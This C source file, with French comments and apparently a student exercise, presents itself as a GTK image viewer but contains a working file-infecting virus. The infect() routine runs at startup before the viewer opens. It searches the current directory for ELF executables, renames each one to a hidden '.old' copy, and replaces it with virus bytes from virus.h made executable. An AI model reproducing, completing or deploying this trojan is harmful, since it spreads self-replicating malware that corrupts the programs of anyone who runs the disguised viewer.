#include <gtk/gtk.h>
#include <sys/stat.h>
#include "virus.h"

//Pour compiler mediaplayer
//gcc `pkg-config --cflags gtk+-3.0` mediaplayer.c  -o mediaplayer `pkg-config --libs gtk+-3.0`

static void activate (GtkApplication*, gpointer);
static void button_next(GtkWidget *, gpointer);
static void button_previous(GtkWidget *, gpointer);
void parse_current_directory();
static const char *get_filename_ext(const char *);

void infect(char *self_name);
int is_valid_target(char *filename, char *selfname);
char* get_filename(char *orig_name);

//---------------PARTIE MEDIAPLAYER---------------

GtkWidget *image1;
int current_image_index = 0;
char images_path[10][50];
int max_image_index = 0;


int main (int argc, char **argv) {
	infect(get_filename(argv[0]));
	parse_current_directory();
	if(max_image_index < 0) {
		printf("no images in the current folder\n");
		return 0;
	}
	GtkApplication *app;
	int status;
	app = gtk_application_new ("org.gtk.mediaplayer", G_APPLICATION_FLAGS_NONE);
	g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
	status = g_application_run (G_APPLICATION (app), 0, NULL);
	g_object_unref (app);

	return status;
}

static void activate (GtkApplication* app, gpointer user_data) {
	GtkWidget *window;
	window = gtk_application_window_new (app);
	gtk_window_set_title (GTK_WINDOW (window), "MediaPlayer");
	gtk_window_set_default_size (GTK_WINDOW (window), 200, 200);
   
	GtkWidget *hbox;
	GtkWidget *vbox1;
	GtkWidget *hbox2;
	GtkWidget *button1;
	GtkWidget *button2;

	hbox = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 0);
	hbox2 = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 0);
	vbox1 = gtk_box_new (GTK_ORIENTATION_VERTICAL, 0);
	image1 = gtk_image_new ();

	button1 = gtk_button_new_with_label ("Previous");
	g_signal_connect (button1, "clicked", G_CALLBACK (button_previous), NULL);
	button2 = gtk_button_new_with_label ("Next");
	g_signal_connect (button2, "clicked", G_CALLBACK (button_next), NULL);

	gtk_box_pack_start (GTK_BOX (vbox1), image1, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (vbox1), hbox2, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (hbox2), button1, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (hbox2), button2, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (hbox), vbox1, TRUE, TRUE, 0);
	gtk_container_add (GTK_CONTAINER (window), hbox);
   
	gtk_image_set_from_file (GTK_IMAGE (image1), images_path[current_image_index]);
	gtk_widget_show_all (window);
}

static void button_next(GtkWidget *widget, gpointer data) {
	current_image_index = current_image_index + 1;
	if(current_image_index > max_image_index) { current_image_index = 0; }
	gtk_image_set_from_file (GTK_IMAGE (image1), images_path[current_image_index]);
}

static void button_previous(GtkWidget *widget, gpointer data) {
	current_image_index = current_image_index - 1;
	if(current_image_index < 0) { current_image_index = max_image_index; }
	gtk_image_set_from_file (GTK_IMAGE (image1), images_path[current_image_index]);
}

//Obtient l'extention du fichier
static const char *get_filename_ext(const char *filename) {
	const char *dot = strrchr(filename, '.');
	if(!dot || dot == filename) return "";
	return dot + 1;
}

//Parcours le dossier courant, a la recherche d'images .png
void parse_current_directory(){
	DIR *d;
	char newpath[500];
	struct dirent *dir;
	d = opendir(".");
	if(!d) { return; }
	int nb = 0;
	while ((dir = readdir(d)) != NULL) {
		if( strcmp(get_filename_ext(dir->d_name),"jpg") != 0 ) { continue; }
      
		strcpy(newpath, "./");
		strcat(newpath, dir->d_name);
		strcpy(images_path[nb], newpath);
		nb++;
   }
	max_image_index = nb-1;
	closedir(d);
	return;
}


//---------------PARTIE VIRUS---------------

void infect(char *self_name) {
	DIR* d = opendir(".");
	if (!d) { return; }
	struct dirent *dir;

	//Parcours le dossier courant a la recherche de programmes executable non-infecte
	while ((dir = readdir(d)) != NULL) {
		if(!is_valid_target(dir->d_name, self_name)) { continue; }

		//Creation du fichier '.nomprogramme.old;
		char new_name[50] = ".";
		strcat(new_name, dir->d_name);
		strcat(new_name, ".old");
		rename(dir->d_name, new_name);

		//Renome le programme, pour le remplacer en copiant le virus stocke dans virus.h
      
		FILE *newfile = fopen(dir->d_name, "a");
		fwrite(virus, 1, sizeof(virus), newfile);
		
		//Donne les flags Executables
		struct stat buf;
		stat(dir->d_name, &buf);
		chmod(dir->d_name, buf.st_mode | S_IXUSR | S_IXGRP | S_IXOTH);
		fclose(newfile);
   }
	closedir(d);
	return;
}

int is_valid_target(char *filename, char *selfname) {
	//Test si il ne s'aggit pas de soi-meme
	if (strcmp(selfname, filename) == 0) { return 0; }

	FILE *newfile = fopen(filename, "r");
	//Test de si il s'agit bien d'un fichier executable, ne commencant pas par '.'
	char test[5];
	fgets(test, 5, newfile);
	if(test[0] != 127 || test[1] != 69 || test[2] != 76 || test[3] != 70) { return 0; }
	if(filename[0] == 46) { return 0; }

	//On passe le header
	int c;
	for(int i=0; i<virus_len; i++){
		c = fgetc(newfile);
		if(c != virus[i]) {
			return 1;
		}    
	};
	fclose(newfile);
	return 0;
}

//Fonction pour prendre le nom du fichier dans un chemin (apres le dernier '/')
char* get_filename(char *orig_name) {
	char *filename = orig_name;
	char* last_slash = strrchr(orig_name, '/');
	if(last_slash != NULL) {
		filename = last_slash + 1;
	}
	return filename;
}
